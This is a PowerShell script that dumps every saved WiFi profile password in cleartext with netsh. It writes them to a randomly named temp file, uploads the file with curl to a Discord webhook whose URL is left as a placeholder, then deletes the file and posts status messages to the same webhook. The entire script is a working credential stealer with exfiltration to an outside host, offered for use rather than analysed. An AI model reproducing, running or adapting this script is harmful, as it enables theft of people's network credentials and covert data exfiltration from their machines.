function Get-WiFiPasswords {
    sendMessage("Dumping WiFi passwords")
    
    $profilesOutput = netsh wlan show profiles
    if ($profilesOutput -match "There is no wireless interface on the system" -or !$profilesOutput) {
        sendMessage("No wireless interfaces found.")
        return
    }

    $ex = ".tmp"
    $tempPath = $Env:TEMP
    $fileOut = generateFileName
    $fileOut = $fileOut + $ex
    $fullPath = $tempPath + "\" + $fileOut
    $WiFiPasswords = @{}

    ($profilesOutput | Select-String -Pattern "\:(.+)$") | ForEach-Object {
        $Name = $_.Matches.Groups[1].Value.Trim()

        $profileDetails = netsh wlan show profile name="$Name" key=clear
        $keyLine = $profileDetails | Select-String -Pattern "Key Content\W+\:(.+)$"

        if ($keyLine) {
            $Pass = $keyLine.Matches.Groups[1].Value.Trim()
        }
        else {
            $Pass = "[No Password Found]"
        }

        $WiFiPasswords[$Name] = $Pass
    }
    try {
        $WiFiPasswords | ConvertTo-Json -Depth 10 | Out-File -FilePath $fullPath -Force
    }
    catch {
        $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
        sendMessage($message)
    }

    discordExfiltration -fileOut $fullPath
    removeFile -path $fullPath

}

Function generateFileName {
    # Generate a random string using characters from the specified ranges
    $fileName = -join ((48..57) + (65..90) + (97..122) | ForEach-Object { [char]$_ } | Get-Random -Count 5)
    return $fileName
}
function discordExfiltration {
    param(
        $fileOut
    )
    try {
        # Path to your JSON file
        $jsonFilePath = $fileOut
            
            
        # Ensure the file exists before sending it
        if (Test-Path $jsonFilePath) {
            $fileSize = Get-ItemProperty -Path $fileOut | Select-Object -ExpandProperty Length

            if ($fileSize -gt 10000000) {
                return $fileOut
            }
            try {
                $curlCommand = "curl.exe -w '%{http_code}' -s -X POST $hookUrl -F 'file=@$jsonFilePath' -H 'Content-Type: multipart/form-data' | Out-Null"
                Invoke-Expression $curlCommand
    
            }
            catch {
                $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
                sendMessage($message)
            }
    
                
        }
        else {
            $message = "The JSON file was not found. Please check the file path."
            sendMessage($message)
        }
    }
    catch {
        $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
        sendMessage($message)
    }
        
}

function removeFile {
    param(
        $path
    )
    if (Test-Path $path) {
    
        Remove-Item -Path "$path" -Force
        $message = "File at $path deleted;)"
        sendMessage($message)
    
    }
    else {
        $message = "I was not able to remove the file at $path....What happened?"
        sendMessage($message)
    }
        
}

function sendMessage {
    param(
        $message
    )
    $payload = @{ content = $message } | ConvertTo-Json -Depth 10
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body $payload -ContentType "application/json"
}

$hookUrl = "https://discord.com/api/webhooks/XXXXXX" # CHANGE THIS
Get-WiFiPasswords
